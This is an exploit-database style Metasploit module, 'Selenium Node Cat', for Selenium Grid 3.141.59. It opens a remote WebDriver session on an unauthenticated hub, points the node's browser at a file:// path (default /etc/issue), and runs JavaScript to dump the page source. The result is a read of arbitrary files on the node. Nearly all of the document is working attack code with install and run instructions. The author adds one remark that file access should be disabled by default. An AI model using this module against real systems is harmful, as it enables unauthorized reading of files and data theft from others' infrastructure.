# Exploit Title: Selenium Node Cat
# Date: 3/7/2021
# Exploit Author: Jon Statton
# Vendor Homepage: https://www.selenium.dev/
# Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
# Version: 3.141.59
# Tested on: 3.141.59 + Firefox(geckodriver)

# I think the download and upload of files on a Selenium Node should be turned off by default on the Hub level. It should be something that has to be turned on explicitly, maybe with some type of authorization.

# DESCRIPTION: Basically a minimal version of Selenium Node Download. Rather than try build an inline HTML form, this just loads the file like “file:///tmp/blah.txt” and dumps the loaded page. This is useful for like small text files, and just for testing interaction with the file-system on a Selenium Node.

# INSTALL: To install on Debian based systems, "apt-get install ruby-selenium-webdriver". Then copy this to "~/.msf4/modules/exploits/multi/http/" or whatever.

# RUN: Set "URL" to the HUB URL (Should look like http://selenium-hub.lan:4444/wd/hub). Set "REMOTE_FILE" to the path and name of file on the NODE (example: /tmp/blah.txt).

require 'json'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Cat',
      'Description'    => %q{
        Use the browser(Firefox) on a Selenium Node to cat a file.
        Basically it uses the browser to load a text file into the browser
        then it dumps the page text.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'       => [
        [
          'Native Payload', {
            'Platform' => %w{ linux osx win unix },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Selenium Hub URL. http://selenium-hub.lan:4444/wd/hub']),
        OptString.new('REMOTE_FILE', [true, 'The Remote File to cat', '/etc/issue'])
        OptString.new('BROWSER', [false, 'The BrowserName to use.', 'firefox'])
      ])
  end

  def exploit
    remote_file = datastore['REMOTE_FILE']
    browser = datastore['BROWSER']

    # Start session. driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => { :browserName => browser }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:desiredCapabilities => {:browserName => browser}})
    })
    sessionId = res.get_json_document["value"]["sessionId"] ? res.get_json_document["value"]["sessionId"] : res.get_json_document["sessionId"]


    # driver.get('file://%s' % [remote_file])
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => 'file://%s' % [remote_file]})
    })

    # driver.page_source
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'execute', 'sync'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:args => [], :script => "var source = document.documentElement.outerHTML;if (!source) { source = new XMLSerializer().serializeToString(document); }return source;"})
    })

    # End session
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId)
    })
  end

end
